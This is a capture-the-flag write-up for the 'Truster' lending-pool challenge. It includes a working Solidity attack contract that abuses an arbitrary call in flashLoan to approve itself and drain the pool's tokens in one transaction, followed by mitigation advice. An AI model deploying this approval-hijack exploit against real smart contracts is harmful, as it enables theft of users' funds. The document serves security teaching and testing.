## `flashLoan` function allows anyone to call any external contract function on behalf of the Pool

A malicious actor can pass the token address as target, to `approve` any desired address and then execute a `transferFrom` to take the funds. 

Notice: a requirement of the CTF is to execute the attack within a single transaction. For this we have multiple options like:
- Execute the exploit logic on the constructor of a contract (so the only transaction will be the contract deployment).
- Use a multicall contract BUT deployed by "someone else", so we don't sum the deploment tx to the executed txs.

### PoC
Create an 'Attacker' contract with the exploit logic on the constructor:
```solidity
contract Attacker {
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // 1. Prepare token approve data 
        bytes4 selector = bytes4(keccak256(bytes("approve(address,uint256)")));
        bytes memory data = abi.encodeWithSelector(selector, address(this), token.balanceOf(address(pool)));

        // 2. Call flashloan to execute the approve
        pool.flashLoan(0, address(this), address(token), data); // notice: 0 as amount to not modify the pool's balance and receiver could be any address

        // 4. execute transferFrom to recover the funds 
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
```
Then just deploy it on the test suite:
```solidity
    function test_truster() public 
    checkSolvedByPlayer 
    {
        // the constructor of the contract has the attack logic. Also the deploy is a single tx
        new Attacker(pool, recovery, token);
    }
```

### Recommended mitigation
- Follow the ERC-3156 standard rules for flashloan implementation or, at least, hardcode the call to `onFlashLoan` instead of allow any arbitrary function. 
- In case it is required to allow calls to any receiver contract's function (For any kind of specific business logic) consider to add a whitelist of allowed receivers that goes through a previous security process. 